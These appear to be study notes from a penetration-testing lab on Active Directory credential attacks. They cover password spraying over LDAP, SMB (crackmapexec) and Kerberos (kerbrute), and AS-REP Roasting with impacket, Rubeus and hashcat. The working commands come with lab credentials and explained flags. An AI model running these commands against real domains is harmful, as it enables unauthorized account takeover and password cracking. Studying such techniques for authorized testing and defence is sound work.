  

- Uses LDAP and ADSI to perform a low and slow password attack against AD users.  
    - we can also make queries in the context of a different user by setting the DirectoryEntry instance  
    - provide three arguments, including the LDAP path to the domain controller, the username, and the password  
    - `$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() $PDC = ($domainObj.PdcRoleOwner).Name $SearchString = "LDAP://" $SearchString += $PDC + "/" $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))" $SearchString += $DistinguishedName New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")`  
    - output -> `distinguishedName : {DC=corp,DC=com} Path: LDAP://DC1.corp.com/DC=corp,DC=com`  
    - To avoid incorrect password Exceptions  
    -change the password in the constructor to **WrongPassword**
- We could use this technique to create a PowerShell script that enumerates all users and performs authentications according to the Lockout threshold and Lockout observation window.  
    -This password spraying tactic is already implemented in the PowerShell script **`C:\Tools\Spray-Passwords.ps1`**  
    -`cd C:\Tools`
    - `powershell -ep bypass`
    - `.\Spray-Passwords.ps1 -Pass Nexus123! -Admin`
        - -Pass = set a single password to test
        - -File = submit a wordlist file
        - -Admin = test admin accounts
    - Output --> `'pete' with password: 'Nexus123!' 'jen' with password: 'Nexus123!'`

2nd Type of Password spraying attack (SMB):  
- Drawback:  
- For example, for every authentication attempt, a full SMB connection has to be set up and then terminated.  
- **crackmapexec**  
- `cat users.txt`  
- `crackmapexec smb 192.168.200.75 -u usernames.txt -p 'Nexus123!' -d corp.com --continue-on-success`  
- smb = protocol  
- -u = username/file  
- -p = password  
- -d = domain  
- --continue-on-success = avoid stopping at the first valid credential  
- Bonus:  
- output of crackmapexec not only displays if credentials are valid, but also if the user with the identified credentials has admin priv on tgt system  
- Dave is a local admin on CLIENT75. Let's use crackmapexec with the password Flowers1 targeting this machine  
-`crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com`

3rd Type of Password spraying attack (TGT)

- _kinit_
    - Can obtain and cache a Kerberos TGT
        - Need to provide a username and password
    - Advantage:
        - only uses two UDP frames
            - To determine whether the password is valid, it sends only an AS-REQ and examines the response
- _kerbrute_
    - automate obtaining and caching a Kerberos TGT
    - Location: **`C:\Tools`**  
        `.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"`  
        - passwordspray = command  
        - -d = domain  
        - user.file pass  
        -[`If you receive a network error, make sure that the encoding of usernames.txt is ANSI. You can use Notepad's Save As functionality to change the encoding.`]

### 

AS-REP Roasting

- _Kerberos preauthentication_
    - As we have discussed, the first step of the authentication process via Kerberos is to send an AS-REQ. Based on this request, the domain controller can validate if the authentication is successful. If it is, the domain controller replies with an AS-REP containing the session key and TGT
- _AS-REP Roasting_ (attack)
    - Without Kerberos preauthentication in place, an attacker could send an AS-REQ to the domain controller on behalf of any AD user. After obtaining the AS-REP from the domain controller, the attacker could perform an offline password attack against the encrypted part of the response.
    - By default, the AD user account option Do not require Kerberos preauthentication is disabled
    - However, it is possible to enable this account option manually

Perform AS-REP Roasting on Linux

- **impacket-GetNPUsers**
    - To perform AS-REP roasting
    - `impacket-GetNPUsers -dc-ip 192.168.200.70 -request -outputfile hashes.asreproast corp.com/pete`
        - password = Nexus123!
        - **-dc-ip** = IP address of the domain controller
        - **-outputfile** = output file in which the AS-REP hash will be stored in Hashcat format
        - **-request** = request the TGT
        - **domain/user** = user authentification format
    - Check the correct mode for the AS-REP hash in Hashcat  
        -`hashcat --help | grep -i "Kerberos"`
        - output --> `18200 | Kerberos 5, etype 23, AS-REP`
    - Crack the hash  
        -`sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
        - output --> Flowers1
            - If you get "Not enough allocatable device memory for this attack", shut down your Kali VM and add more RAM to it.

Perform AS-REP Roasting on Windows

- _Rubeus_
    - toolset for raw Kerberos interactions and abuses
    - Set up:  
        -RDP -> CLIENT75 jeff HenchmanPutridBonbon11
    - Start:
        - `cd C:\Tools`
        - `.\Rubeus.exe asreproast /nowrap`
            - **asreproast** = pre-authenticated domain
            - **/nowrap** = no new lines
        - Copy hash to home dir and crack
            - `sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
- Identify users with the enabled AD user account option _Do not require Kerberos preauthentication_
    - [Windows] PowerView
        - _Get-DomainUser_
            - **-PreauthNotRquired**
    - [Kali] _impacket-GetNPUsers_
        - without the **-request** and **-outputfile** options.
- Can use _GenericWrite_ or _GenericAll_ permissions to modify the User Account Control value of the user to not require Kerberos preauthentication.
    - Known as _Targeted AS-REP Roasting_